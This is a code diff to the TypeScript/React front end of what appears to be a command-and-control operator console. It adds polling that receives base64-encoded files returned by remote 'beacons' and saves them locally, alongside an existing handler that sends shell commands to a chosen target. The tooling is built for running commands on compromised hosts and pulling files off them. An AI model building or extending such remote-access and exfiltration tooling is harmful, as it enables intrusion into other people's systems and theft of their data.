@@ -9,13 +9,19 @@ import ping from "@/api/ping";
 import { fetch, Body as _ } from "@tauri-apps/api/http";
 import { http } from "@tauri-apps/api";
 
+interface IData {
+    id: number;
+    msg: string;
+    file?: { name: string; content: string };
+}
+
 const Home: FC = () => {
     const [messageApi, contextHolder] = message.useMessage();
     const [inputValue, setInputValue] = useState("");
     const [isModalOpen, setIsModalOpen] = useState(false);
     const [hosts, setHosts] = useState(0);
     const [newBeaconNum, setNewBeaconNum] = useState(0);
-    const [data, setData] = useState<{id:number,msg:string}[]>([]);
+    const [data, setData] = useState<IData[]>([]);
     const [beaconList, setBeaconList] = useState<number[]>([0, 1, 2]);
     const [targetId, setTargetId] = useState(0);
 
@@ -57,9 +63,9 @@ const Home: FC = () => {
      */
     const handleInputEnter = async () => {
         console.log(inputValue);
-        const cmd_arr = inputValue.split(" ");                    
+        const cmd_arr = inputValue.split(" ");
         let cmd = cmd_arr[0];
-        let param = cmd_arr[1];        
+        let param = cmd_arr[1];
         const res = await shell(targetId, cmd, param);
         console.log(res, "<--res");
         setInputValue("");
@@ -68,7 +74,21 @@ const Home: FC = () => {
         if (pingLock.current) {
             setInterval(async () => {
                 console.log("ping");
-                const res = (await ping()) as { c2: string; message: string };
+                const res = (await ping()) as {
+                    c2: string;
+                    message: string;
+                    file?: { name: string; content: string };
+                };
+
+                new Promise<{ name: string; content: string }>((resolve) => {
+                    if (!!res.file) {
+                        resolve(res.file);
+                        res.message = `Downloading ${res.file.name}, please wait a moment...`;
+                    }
+                }).then((file_obj) => {
+                    downloadFileFromBase64(file_obj);
+                });
+
                 setData((prev) => [...prev, { id: +res.c2, msg: res.message }]);
             }, 1000);
         }
@@ -76,6 +96,35 @@ const Home: FC = () => {
             pingLock.current = false;
         };
     }, []);
+    function downloadFileFromBase64(file: { name: string; content: string }) {
+        // console.log(file, "<--file");
+        // 将 Base64 编码的字符串解码为二进制数据
+        const base64String = file.content;
+        const fileName = file.name;
+        const binaryString = atob(base64String);
+        const length = binaryString.length;
+        const bytes = new Uint8Array(length);
+        for (let i = 0; i < length; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+
+        // 创建 Blob 对象
+        const blob = new Blob([bytes], { type: "application/octet-stream" });
+
+        // 创建 Blob URL
+        const blobUrl = URL.createObjectURL(blob);
+
+        // 创建链接元素并设置属性
+        const link = document.createElement("a");
+        link.href = blobUrl;
+        link.download = fileName;
+
+        // 模拟点击链接以触发下载
+        link.click();
+
+        // 释放 Blob URL
+        URL.revokeObjectURL(blobUrl);
+    }
 
     const showModal = () => {
         setIsModalOpen(true);
@@ -166,7 +215,7 @@ const Home: FC = () => {
                     right: 0,
                     boxSizing: "border-box",
                     color: "#ffffff",
-                    maxHeight: "50vh",
+                    maxHeight: "65vh",
                     overflow: "auto",
                 }}
                 header={
